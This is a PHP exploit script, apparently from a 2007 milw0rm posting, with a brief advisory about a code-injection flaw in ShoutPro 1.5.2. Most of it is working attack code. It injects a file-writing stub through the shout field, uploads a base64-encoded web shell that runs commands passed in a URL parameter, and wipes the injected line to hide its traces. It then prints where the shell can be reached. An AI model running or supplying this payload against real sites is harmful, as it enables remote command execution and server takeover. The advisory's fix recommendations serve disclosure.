@@ -1,0 +1,90 @@
+<?/*
+File: shoutbox.php
+Affects: ShoutPro 1.5.2 (may affect earlier versions)
+Date: 17th April 2007
+
+Issue Description:
+===========================================================================
+ShoutPro 1.5.2 fails to fully sanitize user input ($shout) that it writes
+to the shouts.php file when adding a new message, this can result in the
+injection and execution of arbitrary php code.
+===========================================================================
+
+Scope:
+===========================================================================
+The vulnerability will in most cases allow an attacker to execute commands
+on the system, the issue may be further perpetuated if the user has followed
+the official documentation and chmoded the base folder to '777'
+===========================================================================
+
+Recommendation:
+===========================================================================
+1) Add code to perform strip_tags() on $shout in shoutbox.php
+2) Prevent direct access to shouts.php with a .htaccess file
+===========================================================================
+
+Discovered By: Gammarays
+*/?>
+
+
+<?php
+
+echo "########################################################\n";
+echo "#   Special Greetings To - Timq,Warpboy,The-Maggot     #\n";
+echo "########################################################\n\n\n";
+
+//Writes Files - Under 100 bytes to meet requirements
+$temppayload = "%3C%3F%24a%3Dfopen%28%24_POST%5B%27f%27%5D%2C%27w%27%29%3Bfwrite%28%24a%2Cbase64_decode%28%24_POST%5B%27d%27%5D%29%29%3Bfclose%28%24a%29%3B%3F%3E";
+
+//Execute Commands + Performs Cleanup
+$payload = "PD9waHAgCgppZihpc3NldCgkX0dFVFsnY21kJ10pKQp7CmVjaG8gc2hlbGxfZXhlYyh1cmxkZWNv".
+          "ZGUoJF9HRVRbJ2NtZCddKSk7CmRpZSgpOwp9CgppZigkX1BPU1RbJ2NsZWFuJ109PSdkb2l0Jykg".
+          "Y2xlYW4oKTsKCmZ1bmN0aW9uIGNsZWFuKCkKewogICRsMSA9IGZpbGUoJ3Nob3V0cy5waHAnKTsK".
+          "ICAkZmggPSBmb3Blbignc2hvdXRzLnBocCcsJ3cnKTsKICBpZighJGZoKSBkaWUoKTsKCiAgZm9y".
+          "ZWFjaCAoJGwxIGFzICRsMikgCiAgewoJaWYoIXN0cnN0cigkbDIsIiRhPWZvcGVuIikpCgl7CgkJ".
+          "ZnByaW50ZigkZmgsJGwyKTsKCX0gICAgCiAgfQogIGZjbG9zZSgkZmgpOwp9Cgo/Pg==";
+
+
+
+if($argc!=2) die("Usage: <url> \n\tEx: http://www.example.com/shoutpro/\n");
+
+$url = $argv[1];
+//$url = "http://localhost/ShoutPro1.5.2/";
+
+$ch = curl_init($url . "shoutbox.php");
+if(!$ch) die("Error Initializing CURL");
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$res = curl_exec($ch);
+if(!$res) die("Error Connecting To Target - Is URL Valid?");
+
+echo "[ ] Deploying Temp Payload...\n";
+
+curl_setopt($ch, CURLOPT_URL,$url . "shoutbox.php?action=post");
+curl_setopt($ch, CURLOPT_POST,1);
+curl_setopt($ch,
+CURLOPT_POSTFIELDS,"name=Beethoven&pass=&shout=".$temppayload."&post=Post");
+$res = curl_exec($ch);
+if(!$res) die("Error Deploying Temp Payload");
+
+echo "[ ] Deploying Main Payload...\n";
+
+curl_setopt($ch, CURLOPT_URL,$url . "shouts.php");
+curl_setopt($ch, CURLOPT_POSTFIELDS,"f=module.php&d=".$payload);
+$res = curl_exec($ch);
+if(!$res) die("Error Deploying Main Payload");
+
+echo "[ ] Attempting Clean Up...\n";
+
+curl_setopt($ch, CURLOPT_URL,$url . "module.php");
+curl_setopt($ch, CURLOPT_POSTFIELDS,"clean=doit");
+$res = curl_exec($ch);
+if(!$res) die("Error - Clean Up Failed");
+
+echo "[ ] Clean Up Complete\n";
+echo "[ ] Shell Accessible at ".$url."module.php?cmd=<yourcommand>";
+
+curl_close($ch);
+?>
+
+# milw0rm.com [2007-04-17]
